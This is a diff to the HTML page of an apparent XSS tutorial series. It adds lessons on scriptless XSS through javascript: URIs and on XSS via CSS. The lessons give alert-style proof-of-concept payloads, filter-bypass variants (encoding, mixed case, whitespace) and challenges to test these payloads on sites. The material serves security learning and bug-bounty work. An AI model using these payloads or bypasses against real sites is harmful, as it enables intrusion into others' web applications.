@@ -625,7 +625,7 @@ var name = '');alert(1);//';     // this executes alert(1) & XSS </code></pre>
        <!-- Day 7 start -->
       <div class="suggested-topics">
         <a class="topic" href="#day7">
-          <span style="font-size: larger;">Day 7 – Practice: Test, Fail, Learn, Repeat</span>
+          <span style="font-size: larger;">Day 7: Practice - Test, Fail, Learn, Repeat</span>
           <span class="plus">+</span>
         </a>
       </div>
@@ -711,7 +711,7 @@ var name = '');alert(1);//';     // this executes alert(1) & XSS </code></pre>
       <!-- Day 8 Start -->
       <div class="suggested-topics">
         <a class="topic" href="#day8">
-          <span style="font-size: larger;">Day 8 - Introduction to DOM-Based XSS</span>
+          <span style="font-size: larger;">Day 8: Introduction to DOM-Based XSS</span>
           <span class="plus">+</span>
         </a>
       </div>
@@ -863,7 +863,7 @@ document.getElementById("output").innerHTML = search;</code></pre>
       <!--  Day 9 Start -->
       <div class="suggested-topics">
         <a class="topic" href="#day9">
-          <span style="font-size: larger;">Day 9: Day 9 – Event Handler XSS</span>
+          <span style="font-size: larger;">Day 9: Event Handler XSS</span>
           <span class="plus">+</span>
         </a>
       </div>
@@ -981,14 +981,157 @@ document.getElementById("output").innerHTML = search;</code></pre>
       <!-- Day 10 Start -->
       <div class="suggested-topics">
         <a class="topic" href="#day10">
-          <span style="font-size: larger;">Day 10:</span>
+          <span style="font-size: larger;">Day 10: Scriptless XSS</span>
           <span class="plus">+</span>
         </a>
       </div>
       <div class="day10-content" style="display: none;">
-        Coming Soon...
+        <p>Most leaners think we need &lt;script&gt; or an event like onerror to run JavaScript.</p>
+        <p>But with scriptless XSS, we can execute JavaScript by using browser features that naturally interpret certain values as code.</p>
+        <h3>How it works ?</h3>
+        <p>Some HTML tags have attributes that can directly trigger JavaScript when given a javascript​: URI - no &lt;​script&gt; tag needed.</p>
+        <h3>Example Payloads:</h3>
+        <div class="code-block-wrapper"  style="margin-top: -50px;">
+            <div class="flex justify-end" style="position: relative; display: flex; justify-content: flex-end; padding: 0.5rem; background-color: var(--accent-color); border-bottom: 1px solid var(--border-color); top: 50px;">
+              <button class="code-cp-btn"> 
+                <svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy" aria-hidden="true">
+                    <rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect>
+                    <path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path>
+                </svg> </button>
+            </div>
+            <pre><code class="code-txt">&lt;iframe src="javascript​:alert(1)"&gt;&lt;/iframe&gt;</code></pre>
+        </div>
+        <div class="code-block-wrapper"  style="margin-top: -50px;">
+            <div class="flex justify-end" style="position: relative; display: flex; justify-content: flex-end; padding: 0.5rem; background-color: var(--accent-color); border-bottom: 1px solid var(--border-color); top: 50px;">
+              <button class="code-cp-btn"> 
+                <svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy" aria-hidden="true">
+                    <rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect>
+                    <path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path>
+                </svg> </button>
+            </div>
+            <pre><code class="code-txt">&lt;a href="javascript​:alert(1)"&gt;Click me&lt;/a&gt;</code></pre>
+        </div>
+        <div class="code-block-wrapper"  style="margin-top: -50px;">
+            <div class="flex justify-end" style="position: relative; display: flex; justify-content: flex-end; padding: 0.5rem; background-color: var(--accent-color); border-bottom: 1px solid var(--border-color); top: 50px;">
+              <button class="code-cp-btn"> 
+                <svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy" aria-hidden="true">
+                    <rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect>
+                    <path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path>
+                </svg> </button>
+            </div>
+            <pre><code class="code-txt">&lt;form action="javascript​:alert(1)"&gt;
+ &lt;input type="submit"&gt;
+&lt;/form&gt;</code></pre>
+        </div>
+        <div class="code-block-wrapper"  style="margin-top: -50px;">
+            <div class="flex justify-end" style="position: relative; display: flex; justify-content: flex-end; padding: 0.5rem; background-color: var(--accent-color); border-bottom: 1px solid var(--border-color); top: 50px;">
+              <button class="code-cp-btn"> 
+                <svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy" aria-hidden="true">
+                    <rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect>
+                    <path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path>
+                </svg> </button>
+            </div>
+            <pre><code class="code-txt">&lt;embed src="javascript​:alert(1)"&gt;</code></pre>
+        </div>
+        <h3>Why This Works ??</h3>
+        <p>Browsers treat certain attribute values as executable code if they start with javascript​: </p>
+        <p>If the site doesn’t sanitize these attributes, our code will run.</p>
+        <h3>Today's Our Challenge</h3>
+        <ul>
+          <li>Find where your input is reflected inside an attribute like href, src, or action.</li>
+          <li>Try replacing the value with javascript​:alert(1).</li>
+          <li>Test multiple tags some might be blocked, but others will slip through.</li>
+        </ul>
+
+        <h3>Tip:</h3>
+        <p>If javascript​: is filtered, try:</p>
+        <ul>
+          <li>URL encoding <code>(javascript%3Aalert(1))</code></li>
+          <li>Using mixed case <code>(JaVaScRiPt​:alert(1))</code></li>
+          <li>Adding whitespace <code>(javascript :alert(1))</code></li>
+        </ul>
+
+        <h4>that's it for day 10</h4>
       </div>
       <!-- Day 10 End -->
+      <!-- Day 11 Start -->  
+      <div class="suggested-topics">
+        <a class="topic" href="#day11">
+          <span style="font-size: larger;">Day 11: XSS via CSS</span>
+          <span class="plus">+</span>
+        </a>
+      </div>
+      <div class="day11-content" style="display: none;">
+        <p>Yes, that's true CSS can execute JavaScript under certain conditions.</p>
+        <p>This is not just about styling when CSS is combined with certain browser quirks, legacy HTML attributes, or injected into dangerous contexts, it can lead to script execution.</p>
+        <h3>How It Works ??</h3>
+        <h4>XSS via CSS happens when:</h4>
+        <ul>
+          <li>An application allows us to inject CSS into the page (inline &lt;​style&gt; tags, style attributes, or linked stylesheets).</li>
+          <li>The CSS is parsed in a way that triggers JavaScript execution often through expression() (in old IE), url() with javascript​: protocol, or browser-specific parsing bugs.</li>
+          <li>Some HTML attributes like style can be abused if the parser mishandles quotes or contexts.</li>
+          <li>Modern browsers block most of these methods, but legacy browsers, embedded systems, or special parsing contexts can still be vulnerable.</li>
+        </ul>
+        <h3>Example Payloads:</h3>
+        <div class="code-block-wrapper"  style="margin-top: -50px;">
+            <div class="flex justify-end" style="position: relative; display: flex; justify-content: flex-end; padding: 0.5rem; background-color: var(--accent-color); border-bottom: 1px solid var(--border-color); top: 50px;">
+              <button class="code-cp-btn"> 
+                <svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy" aria-hidden="true">
+                    <rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect>
+                    <path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path>
+                </svg> </button>
+            </div>
+            <pre><code class="code-txt">/* Old IE expression() method */
+div { width: expression(alert('XSS via CSS')) }</code></pre>
+        </div>
+        <div class="code-block-wrapper"  style="margin-top: -50px;">
+            <div class="flex justify-end" style="position: relative; display: flex; justify-content: flex-end; padding: 0.5rem; background-color: var(--accent-color); border-bottom: 1px solid var(--border-color); top: 50px;">
+              <button class="code-cp-btn"> 
+                <svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy" aria-hidden="true">
+                    <rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect>
+                    <path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path>
+                </svg> </button>
+            </div>
+            <pre><code class="code-txt">/* url() with javascript​: protocol */
+body { background-image: url("javascript​:alert('CSS XSS')"); }</code></pre>
+        </div>
+
+        <h3>Our Today's Challenge:</h3>
+        <ul>
+          <li>Find a site where we can control CSS (inline styles, <​style> tags, or external stylesheet URLs).</li>
+          <li>Test harmless payloads first (like changing colors).</li>
+          <li>Try older CSS payloads in IE mode or special embedded browsers (e.g., in-app browsers).</li>
+          <li>Document results note where modern browsers block vs. where legacy ones still execute.</li>
+        </ul>
+        <h3>Tip:</h3>
+        <p>Even if modern browsers patch this, CSP misconfigurations + CSS injection can still allow data exfiltration, keylogging (with clever background image tracking), or advanced phishing UI tricks.</p>
+        <p>So do not ignore CSS injection in bug bounty reports sometimes it’s the key to a full exploit chain.</p>
+        
+        <h4>that's it for day 11</h4>
+      </div>
+      <!-- Day 11 End -->
+      <!-- Day 12 Start -->  
+      <div class="suggested-topics">
+        <a class="topic" href="#day11">
+          <span style="font-size: larger;">Day 12: Bypassing HTML Filters with Template Injection</span>
+          <span class="plus">+</span>
+        </a>
+      </div>
+      <div class="day11-content" style="display: none;">
+        Coming soon...
+      </div>
+      <!-- Day 12 End -->
+       <!-- Day 13 Start -->  
+      <div class="suggested-topics">
+        <a class="topic" href="#day11">
+          <span style="font-size: larger;">Day 13: --</span>
+          <span class="plus">+</span>
+        </a>
+      </div>
+      <div class="day11-content" style="display: none;">
+        Coming soon...
+      </div>
+      <!-- Day 13 End -->
       <!--  Evasion Start -->
       <div class="suggested-topics">
         <a class="topic" href="#context-evasion">
@@ -1257,6 +1400,7 @@ document.getElementById("output").innerHTML = search;</code></pre>
       <script src="../../scripts/main.js"></script>
       <script src="../../scripts/msg-popup.js"></script>
 </html>
+
 
 
 
